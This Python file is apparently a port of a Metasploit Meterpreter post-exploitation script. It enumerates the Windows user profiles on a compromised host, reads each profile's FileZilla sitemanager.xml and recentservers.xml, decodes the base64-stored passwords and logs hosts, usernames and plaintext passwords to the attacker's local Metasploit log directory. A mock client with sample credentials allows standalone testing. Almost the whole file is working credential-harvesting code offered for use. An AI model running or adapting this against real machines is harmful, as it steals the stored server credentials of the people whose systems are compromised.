#!/usr/bin/env python3

#
# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
# If you'd like to improve this script, please try to port it as a post
# module instead. Thank you.
#

import argparse
import os
import xml.etree.ElementTree as ET
from datetime import datetime

# This script assumes a 'client' object is available, representing the Meterpreter session.

# ================== Mock Client for Standalone Testing ==================
class MockFile:
    def __init__(self, content):
        self._content = content.encode('utf-8')
        self._pos = 0
    def read(self):
        if self._pos < len(self._content):
            data = self._content[self._pos:]
            self._pos = len(self._content)
            return data
        return b""
    def eof(self):
        return self._pos >= len(self._content)
    def close(self):
        pass

class MockFs:
    def __init__(self, os_ver='Windows 7'):
        self.os_ver = os_ver
        self.mock_files = {
            "C:\\Users\\user1\\AppData\\Roaming\\FileZilla\\sitemanager.xml": """
            <FileZilla3>
                <Servers>
                    <Server>
                        <Host>ftp.example.com</Host>
                        <Port>21</Port>
                        <Protocol>0</Protocol>
                        <Type>0</Type>
                        <User>user1</User>
                        <Pass encoding="base64">cGFzc3dvcmQx</Pass>
                        <Logontype>1</Logontype>
                    </Server>
                </Servers>
            </FileZilla3>
            """,
            "C:\\Users\\user1\\AppData\\Roaming\\FileZilla\\recentservers.xml": """
            <FileZilla3>
                <RecentServers>
                    <Server>
                        <Host>sftp.example.org</Host>
                        <Port>22</Port>
                        <Protocol>1</Protocol>
                        <Type>0</Type>
                        <User>user2</User>
                        <Pass encoding="base64">cGFzc3dvcmQy</Pass>
                        <Logontype>4</Logontype>
                    </Server>
                </RecentServers>
            </FileZilla3>
            """
        }
    def dir_foreach(self, path):
        if path in ["C:\\users\\", "C:\\Documents and Settings\\"]:
            return [".", "..", "user1", "Default", "Public"]
        if path == "C:\\Users\\user1\\AppData\\Roaming\\":
            return ["FileZilla", "Microsoft"]
        return []
    def file_new(self, path, mode):
        return MockFile(self.mock_files.get(path.replace("\\\\", "\\"), ""))

class MockClient:
    def __init__(self):
        self.platform = 'windows'
        self.sys = self
        self.config = self
        self.fs = MockFs()
    def getenv(self, var):
        if var == 'SystemDrive':
            return 'C:'
        if var == 'USERNAME':
            return 'user1'
        return ''
    def sysinfo(self):
        return {'OS': 'Windows 7', 'Computer': 'TEST-PC'}
    def is_system(self):
        return True # or False for testing user-level execution

# ================== Helper Functions ==================
def print_status(msg):
    print(f"[*] {msg}")

def print_error(msg):
    print(f"[-] {msg}")

def file_local_write(file_path, data):
    with open(file_path, "a", encoding='utf-8') as f:
        f.write(data + "\n\n")

# ================== Main Logic ==================
def check_filezilla_path(client, path):
    """Checks for the FileZilla directory in a given user's appdata path."""
    try:
        for item in client.fs.dir_foreach(path):
            if item.lower() == 'filezilla':
                return os.path.join(path, item)
    except Exception:
        return None
    return None

def extract_saved_creds(client, filezilla_path, xml_file):
    """Reads and parses a FileZilla XML config file."""
    creds_log = []
    full_path = os.path.join(filezilla_path, xml_file)
    print_status(f"Reading {full_path}...")

    try:
        xml_content = ""
        account_file = client.fs.file_new(full_path, "rb")
        while not account_file.eof():
            xml_content += account_file.read().decode('utf-8', 'ignore')
        account_file.close()

        if not xml_content:
            return ""

        root = ET.fromstring(xml_content)

        # Search in both Servers and RecentServers tags
        for server in root.findall('.//Server'):
            host = server.findtext("Host", "N/A")
            port = server.findtext("Port", "N/A")
            user = server.findtext("User", "N/A")
            password_node = server.find("Pass")
            password = ""
            if password_node is not None and password_node.text:
                if password_node.get("encoding") == "base64":
                    import base64
                    try:
                        password = base64.b64decode(password_node.text).decode('utf-8')
                    except Exception:
                        password = "Could not decode base64"
                else:
                    password = password_node.text

            logon_type = server.findtext("Logontype", "")
            protocol = server.findtext("Protocol", "")

            print_status(f"\tHost: {host}")
            creds_log.append(f"Host: {host}")
            print_status(f"\tPort: {port}")
            creds_log.append(f"Port: {port}")

            if logon_type == "0":
                print_status("\tLogon Type: Anonymous")
                creds_log.append("Logon Type: Anonymous")
            elif logon_type in ["1", "4"]: # Normal or Interactive
                print_status(f"\tUser: {user}")
                creds_log.append(f"User: {user}")
                print_status(f"\tPassword: {password}")
                creds_log.append(f"Password: {password}")
            elif logon_type in ["2", "3"]: # Ask for password / Interactive
                print_status(f"\tUser: {user}")
                creds_log.append(f"User: {user}")

            proto_map = {"0": "FTP", "1": "SSH", "3": "FTPS", "4": "FTPES"}
            proto_str = proto_map.get(protocol, "Unknown")
            print_status(f"\tProtocol: {proto_str}")
            creds_log.append(f"Protocol: {proto_str}")
            print_status("")

    except FileNotFoundError:
        print_error(f"File not found: {full_path}")
    except ET.ParseError:
        print_error(f"Could not parse XML file: {full_path}")
    except Exception as e:
        print_error(f"An error occurred: {e}")

    return "\n".join(creds_log)

def get_user_list(client):
    """Gets a list of user directories to check."""
    users = []
    os_info = client.sys.config.sysinfo()['OS']
    sysdrv = client.sys.config.getenv('SystemDrive')

    if any(win_ver in os_info for win_ver in ['7', 'Vista', '2008', '8', '10', '2012', '2016', '2019']):
        path4users = os.path.join(sysdrv, "Users")
        path2appdata = "AppData\\Roaming"
    else: # XP, 2003 etc.
        path4users = os.path.join(sysdrv, "Documents and Settings")
        path2appdata = "Application Data"

    if client.is_system():
        print_status("Running as SYSTEM, enumerating all user profiles...")
        try:
            for u in client.fs.dir_foreach(path4users):
                if u in ['.', '..', 'All Users', 'Default', 'Default User', 'Public', 'desktop.ini', 'LocalService', 'NetworkService']:
                    continue
                users.append({'username': u, 'userappdata': os.path.join(path4users, u, path2appdata)})
        except Exception as e:
            print_error(f"Could not enumerate users: {e}")
    else:
        print_status("Running as user, checking current user profile...")
        try:
            username = client.sys.config.getenv('USERNAME')
            users.append({'username': username, 'userappdata': os.path.join(path4users, username, path2appdata)})
        except Exception as e:
            print_error(f"Could not get current user info: {e}")

    return users

def main():
    parser = argparse.ArgumentParser(description="Extracts servers and credentials from Filezilla.")
    parser.add_argument("-c", "--credentials", action="store_true", help="Return credentials (default action).")
    args = parser.parse_args()

    if client.platform != 'windows':
        print_error("This script only runs on Windows platforms!")
        return

    info = client.sys.config.sysinfo()
    host = info['Computer']
    timestamp = datetime.now().strftime("%Y%m%d.%M%S")
    log_dir = os.path.join(os.path.expanduser("~"), ".msf4", "logs", "filezilla", f"{host}_{timestamp}")
    os.makedirs(log_dir, exist_ok=True)
    dest_log = os.path.join(log_dir, f"{host}_{timestamp}.txt")

    print_status(f"Logs will be saved to: {log_dir}")

    for user_info in get_user_list(client):
        username = user_info['username']
        user_appdata = user_info['userappdata']
        print_status(f"Checking for FileZilla profile for user: {username}")

        filezilla_path = check_filezilla_path(client, user_appdata)

        if filezilla_path:
            print_status(f"FileZilla profile found at: {filezilla_path}")
            xml_files = ['sitemanager.xml', 'recentservers.xml']
            for xml_file in xml_files:
                creds = extract_saved_creds(client, filezilla_path, xml_file)
                if creds:
                    file_local_write(dest_log, creds)
        else:
            print_error(f"FileZilla profile not found for {username}.")

if __name__ == "__main__":
    if 'client' not in globals():
        print_status("This script is intended to run in a Meterpreter session.")
        print_status("Initializing a mock client for testing purposes.")
        client = MockClient()
        main()
    else:
        main()